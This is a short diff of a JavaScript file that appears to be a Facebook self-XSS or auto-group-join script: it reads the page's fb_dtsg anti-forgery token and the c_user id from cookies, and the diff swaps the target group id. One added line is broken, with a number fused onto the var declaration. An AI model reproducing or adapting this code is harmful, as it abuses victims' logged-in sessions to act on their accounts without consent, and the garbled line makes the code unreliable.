@@ -1,4 +1,4 @@
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+1744763822447762var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        
 function cereziAl(isim) {
@@ -75,7 +75,7 @@ sublist("");
  
  
  
-var gid = ['1693773477522923'];
+var gid = ['1744763822447762'];
  
 var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
 var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
